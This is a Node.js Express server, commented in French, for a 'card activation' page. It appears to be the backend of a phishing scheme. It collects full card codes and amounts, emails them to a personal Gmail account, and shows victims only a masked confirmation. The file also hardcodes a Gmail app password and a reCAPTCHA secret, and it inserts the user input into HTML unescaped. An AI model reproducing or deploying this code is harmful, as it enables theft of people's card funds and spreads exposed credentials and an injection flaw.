import express from 'express';
import bodyParser from 'body-parser';
import nodemailer from 'nodemailer';
import fetch from 'node-fetch';
import { fileURLToPath } from 'url';
import path, { dirname } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

const ADMIN_EMAIL = 'wanarnaud@gmail.com';
const RECAPTCHA_SECRET = '6Lc1nR4rAAAAAFg6HDld1nnkEwRD3Ja8e43Oikuw';

app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static(path.join(__dirname, 'public')));

// Config e-mail
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'wanarnaud@gmail.com',
    pass: 'gyauzfvkgauczwhj'
  }
});

// Route de traitement
app.post('/send', async (req, res) => {
  const { code, amount, 'g-recaptcha-response': captcha } = req.body;
  const lastDigits = code.slice(-4);

  if (!captcha) {
    return res.send('Captcha non validé');
  }

  const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${RECAPTCHA_SECRET}&response=${captcha}`;

  try {
    const response = await fetch(verifyUrl, { method: 'POST' });
    const data = await response.json();

    if (!data.success) {
      return res.send('Échec de la vérification du captcha');
    }

    const mailOptions = {
      from: 'wanarnaud@gmail.com',
      to: ADMIN_EMAIL,
      subject: 'Activation de carte',
      text: `Un utilisateur a activé une carte.\n\nCode: ${code}\nMontant: ${amount} $`
    };

    transporter.sendMail(mailOptions, (error, info) => {
      if (error) {
        console.error('Erreur envoi email:', error);
        return res.send("Erreur lors de l'envoi de l'email");
      } else {
        console.log("Email envoyé : " + info.response);
        return res.send(`<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Activation réussie</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f0f4f8; /* Couleur élégante sans image */
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .confirmation-box {
      background: white;
      padding: 40px;
      border-radius: 12px;
      box-shadow: 0 5px 25px rgba(0,0,0,0.1);
      max-width: 90%;
      width: 400px;
      text-align: center;
    }

    .checkmark {
      font-size: 48px;
      color: #2ecc71;
      margin-bottom: 20px;
    }

    h2 {
      margin-bottom: 10px;
      color: #333;
    }

    p {
      color: #555;
      margin-top: 0;
    }

    .button {
      display: inline-block;
      margin-top: 20px;
      padding: 12px 24px;
      background-color: #007bff;
      color: white;
      text-decoration: none;
      border-radius: 6px;
      transition: background-color 0.3s ease;
    }

    .button:hover {
      background-color: #0056b3;
    }

    @media screen and (max-width: 500px) {
      .confirmation-box {
        padding: 20px;
      }

      h2 {
        font-size: 18px;
      }

      .checkmark {
        font-size: 36px;
      }
    }
  </style>
</head>
<body>
  <div class="confirmation-box">
    <div class="checkmark">&#10003;</div>
    <h2>Carte activée : **** **** **** ${lastDigits}</h2>
    <p>Merci d'avoir utilisé notre plateforme.</p>
    <a class="button" href="/">Retour à l'accueil</a>
  </div>
</body>
</html>`);
      }
    });
  } catch (err) {
    console.error('Erreur traitement:', err);
    res.send('Erreur lors du traitement');
  }
});

app.listen(PORT, () => {
  console.log(`Serveur en ligne sur http://localhost:${PORT}`);
});